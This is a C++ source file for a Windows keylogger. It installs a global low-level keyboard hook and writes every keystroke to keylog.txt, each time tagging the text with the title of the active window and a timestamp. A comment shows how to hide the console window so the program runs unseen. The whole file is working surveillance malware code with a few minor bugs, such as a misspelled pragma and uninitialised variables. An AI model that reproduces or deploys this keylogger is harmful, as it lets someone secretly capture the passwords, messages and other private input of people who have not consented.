#include <iostream>
#include <Windows.h>
#include <time.h>
#include <fstream>
#include <locale>
#include <codecvt>
using namespace std;
#pragma warning(disable:4996)
#pragma warnig(disable:4703)

ofstream file;
HHOOK hook;
KBDLLHOOKSTRUCT kbdStruct;

int save(int key){
    if( key == 1 || key == 2){
        return 0;
    }
    HWND foregd = GetForegroundWindow();
    DWORD threadID;
    HKL key_layout = GetKeyboardLayout(threadID);
    char pProg[256];
    if (foregd){
        threadID = GetWindowThreadProcessId(foregd, nullptr);
        key_layout = GetKeyboardLayout(threadID);
        char cProg[256];

        GetWindowTextA(foregd, cProg, 256);
        if(strcmp(cProg, pProg) != 0)
        {
            strcpy(pProg, cProg);
            time_t t = time(0);
            struct tm * now = localtime(&t);
            char c[64];
            strftime(c, sizeof(c), "%c",now );
            file << "\n\n[Window: " << cProg << " - at " << c << "]\n";


        }
        cout<< key <<'\n';


        if (key == VK_BACK){
            file << "[BACKSPACE]";

        }
        else if (key == VK_RETURN){
            file << "\n";
        }
        else if (key == VK_SPACE){
            file << " ";
        }
        else if (key == VK_TAB){
            file << "[TAB]";
        }
        else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT){
            file << "[SHIFT]";
        }
        else if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL){
            file << "[CONTROL]";
        }
        else if (key == VK_ESCAPE){
            file << "[ESCAPE]";
        }
        else if (key == VK_END){
            file << "[END]";
        }
        else if (key == VK_HOME){
            file << "[HOME]";
        }
        else if (key == VK_LEFT){
            file << "[LEFT]";
        }
        else if (key == VK_UP){
            file << "[UP]";
        }
        else if (key == VK_RIGHT){
            file << "[RIGHT]";
        }
        else if (key == VK_DOWN){
            file << "[DOWN]";
        }
        else if (key == VK_PRIOR){
            file << "[PAGE UP]";
        }
        else if (key == VK_NEXT){
            file << "[PAGE DOWN]";
        }
        else if (key == VK_CAPITAL){
            file << "[CAPS LOCK]";
        }
        else{
            char key1;
            if (key >= 65 && key <= 90){
                if (GetKeyState(VK_CAPITAL)){
                    key1 = key;
                }
                else{
                    key1 = key + 32;
                }
            }
            else{
                key1 = key;
            }
            file << key1;
        }

    }
    file.flush();
    return  0;
}


LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam){
    if(nCode >= 0){
        if(wParam == WM_KEYDOWN){
            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
            save(kbdStruct.vkCode); // save to file

        }
    }
    return CallNextHookEx(hook, nCode, wParam, lParam);
}




int main() {

    //std::cout << "Hello, World!" << std::endl;
    ofstream outfile ("keylog.txt", ios::app);
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);//1 to show console, 0 to hide
    file.open("keylog.txt", ios::app);
    file.imbue(locale(locale(), new codecvt_utf8<wchar_t>)); // to write utf-8 in txt file
    if(!file.is_open()){
        return 1;
    }
    if(!(hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0))){
        //return 1;
        MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
    }
    MSG msg;
    while(1){
        GetMessage(&msg, NULL, 0, 0);
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }





    //return 0;
}
